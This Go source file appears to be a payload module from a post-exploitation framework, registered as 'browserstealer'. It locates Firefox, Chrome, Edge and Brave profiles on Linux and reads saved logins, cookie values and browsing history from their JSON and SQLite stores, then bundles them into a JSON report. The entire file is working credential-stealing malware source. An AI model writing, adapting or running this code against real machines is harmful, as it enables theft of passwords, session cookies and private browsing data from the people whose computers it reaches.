package payloads

import (
	"bufio"
	"bytes"
	"database/sql"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

func init() {
	Register(&BrowserStealer{})
}

type BrowserStealer struct{}

func (b *BrowserStealer) Name() string     { return "browserstealer" }
func (b *BrowserStealer) Category() string { return "credential" }
func (b *BrowserStealer) Description() string {
	return "Extract saved browser credentials, cookies, and history from Chrome/Firefox/Edge/Brave"
}

func (b *BrowserStealer) Execute(args map[string]string) ([]byte, error) {
	s := &browserStealerInner{}
	return s.execute()
}

type browserStealerInner struct {
	results map[string]*browserData
	mu      sync.Mutex
}

type browserData struct {
	Profiles    []profileData  `json:"profiles"`
	Credentials []credEntry    `json:"credentials"`
	Cookies     []cookieEntry  `json:"cookies"`
	History     []historyEntry `json:"history"`
}

type profileData struct {
	Name      string            `json:"profile_name"`
	Logins    []json.RawMessage `json:"logins,omitempty"`
	Cookies   []json.RawMessage `json:"cookies,omitempty"`
	History   []json.RawMessage `json:"history,omitempty"`
	Bookmarks []json.RawMessage `json:"bookmarks,omitempty"`
	Error     string            `json:"error,omitempty"`
}

type credEntry struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

type cookieEntry struct {
	Host   string `json:"host"`
	Name   string `json:"name"`
	Value  string `json:"value"`
	Path   string `json:"path,omitempty"`
	Expiry int64  `json:"expiry,omitempty"`
}

type historyEntry struct {
	URL        string `json:"url"`
	Title      string `json:"title"`
	VisitCount int    `json:"visit_count"`
	LastVisit  int64  `json:"last_visit"`
}

func (s *browserStealerInner) execute() ([]byte, error) {
	s.results = make(map[string]*browserData)
	for _, name := range []string{"firefox", "chrome", "edge", "brave"} {
		s.results[name] = &browserData{}
	}

	var wg sync.WaitGroup

	// Firefox
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.scanFirefox()
	}()

	// Chrome-based
	for _, name := range []string{"chrome", "edge", "brave"} {
		wg.Add(1)
		go func(n string) {
			defer wg.Done()
			s.scanChromeBased(n)
		}(name)
	}

	wg.Wait()

	result := map[string]interface{}{
		"timestamp": time.Now().UTC().Format(time.RFC3339),
		"extraction_summary": map[string]int{
			"firefox_profiles": len(s.results["firefox"].Profiles),
			"chrome_profiles":  len(s.results["chrome"].Profiles),
			"edge_profiles":    len(s.results["edge"].Profiles),
			"brave_profiles":   len(s.results["brave"].Profiles),
		},
		"total_credentials": s.countCredentials(),
		"total_cookies":     s.countCookies(),
		"details":           s.results,
	}

	return MarshalJSON(result)
}

func (s *browserStealerInner) countCredentials() int {
	count := 0
	for _, name := range []string{"firefox", "chrome", "edge", "brave"} {
		for _, p := range s.results[name].Profiles {
			count += len(p.Logins)
		}
	}
	return count
}

func (s *browserStealerInner) countCookies() int {
	count := 0
	for _, name := range []string{"firefox", "chrome", "edge", "brave"} {
		for _, p := range s.results[name].Profiles {
			count += len(p.Cookies)
		}
	}
	return count
}

func (s *browserStealerInner) scanFirefox() {
	home, _ := os.UserHomeDir()
	paths := []string{
		filepath.Join(home, ".mozilla", "firefox"),
		filepath.Join(home, "snap", "firefox", "common", ".mozilla", "firefox"),
	}

	for _, base := range paths {
		entries, err := os.ReadDir(base)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if !e.IsDir() {
				continue
			}
			fullPath := filepath.Join(base, e.Name())
			s.mu.Lock()
			bd := s.results["firefox"]
			s.mu.Unlock()

			pd := profileData{Name: e.Name()}

			// logins.json
			lj := filepath.Join(fullPath, "logins.json")
			if data, err := os.ReadFile(lj); err == nil {
				var raw map[string]interface{}
				if json.Unmarshal(data, &raw) == nil {
					if logins, ok := raw["logins"].([]interface{}); ok {
						for _, l := range logins {
							if b, err := json.Marshal(l); err == nil {
								pd.Logins = append(pd.Logins, b)
							}
						}
					}
				}
			}

			// cookies.sqlite
			cookieFile := filepath.Join(fullPath, "cookies.sqlite")
			if cookies, err := readSQLite(cookieFile, "moz_cookies", []string{"host", "name", "value", "path", "expiry"}); err == nil {
				pd.Cookies = cookies
			}

			// places.sqlite (history)
			placesFile := filepath.Join(fullPath, "places.sqlite")
			if history, err := readSQLite(placesFile, "moz_places", []string{"url", "title", "visit_count", "last_visit_date"}); err == nil {
				pd.History = history
			}

			bd.Profiles = append(bd.Profiles, pd)
		}
	}
}

func (s *browserStealerInner) scanChromeBased(name string) {
	home, _ := os.UserHomeDir()
	var chromPaths []string

	switch name {
	case "chrome":
		chromPaths = []string{
			filepath.Join(home, ".config", "google-chrome"),
			filepath.Join(home, ".config", "chromium"),
		}
	case "edge":
		chromPaths = []string{
			filepath.Join(home, ".config", "microsoft-edge"),
		}
	case "brave":
		chromPaths = []string{
			filepath.Join(home, ".config", "BraveSoftware", "Brave-Browser"),
		}
	}

	s.mu.Lock()
	bd := s.results[name]
	s.mu.Unlock()

	for _, base := range chromPaths {
		entries, err := os.ReadDir(base)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if !e.IsDir() {
				continue
			}
			if e.Name() != "Default" && !strings.Contains(e.Name(), "Profile") {
				continue
			}
			profilePath := filepath.Join(base, e.Name())
			pd := profileData{Name: e.Name()}

			// Login Data
			loginFile := filepath.Join(profilePath, "Login Data")
			if logins, err := readSQLite(loginFile, "logins", []string{"origin_url", "username_value", "password_value", "date_created"}); err == nil {
				pd.Logins = logins
			}

			// Cookies
			cookieFile := filepath.Join(profilePath, "Cookies")
			if cookies, err := readSQLite(cookieFile, "cookies", []string{"host_key", "name", "value", "path", "expires_utc"}); err == nil {
				pd.Cookies = cookies
			}

			// History
			historyFile := filepath.Join(profilePath, "History")
			if history, err := readSQLite(historyFile, "urls", []string{"url", "title", "visit_count", "last_visit_time"}); err == nil {
				pd.History = history
			}

			bd.Profiles = append(bd.Profiles, pd)
		}
	}
}

func readSQLite(path string, table string, columns []string) ([]json.RawMessage, error) {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return nil, err
	}
	// Copy to temp to avoid SQLite locking issues
	tmpFile, err := os.CreateTemp("", "browser-*.db")
	if err != nil {
		return nil, err
	}
	defer os.Remove(tmpFile.Name())

	src, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	if err := os.WriteFile(tmpFile.Name(), src, 0600); err != nil {
		return nil, err
	}
	tmpFile.Close()

	db, err := sql.Open("sqlite3", tmpFile.Name())
	if err != nil {
		return nil, err
	}
	defer db.Close()

	colStr := ""
	for i, c := range columns {
		if i > 0 {
			colStr += ", "
		}
		colStr += c
	}

	query := fmt.Sprintf("SELECT %s FROM %s LIMIT 100", colStr, table)
	rows, err := db.Query(query)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var results []json.RawMessage
	for rows.Next() {
		vals := make([]interface{}, len(columns))
		ptrs := make([]interface{}, len(columns))
		for i := range vals {
			ptrs[i] = &vals[i]
		}
		if err := rows.Scan(ptrs...); err != nil {
			continue
		}
		row := make(map[string]interface{})
		for i, col := range columns {
			row[col] = vals[i]
		}
		b, _ := json.Marshal(row)
		results = append(results, b)
	}

	return results, nil
}

// Shell-based extraction fallback using sqlite3 CLI
func extractSQLiteShell(path, table, columns string) ([]json.RawMessage, error) {
	_, err := exec.LookPath("sqlite3")
	if err != nil {
		return nil, fmt.Errorf("sqlite3 not found")
	}
	cmd := exec.Command("sqlite3", path, fmt.Sprintf("SELECT %s FROM %s LIMIT 100", columns, table))
	out, err := cmd.Output()
	if err != nil {
		return nil, err
	}

	var results []json.RawMessage
	scanner := bufio.NewScanner(bytes.NewReader(out))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		// Parse as JSON
		var raw interface{}
		if json.Unmarshal([]byte(line), &raw) == nil {
			b, _ := json.Marshal(raw)
			results = append(results, b)
		} else {
			b, _ := json.Marshal(map[string]string{"raw": line})
			results = append(results, b)
		}
	}
	return results, nil
}
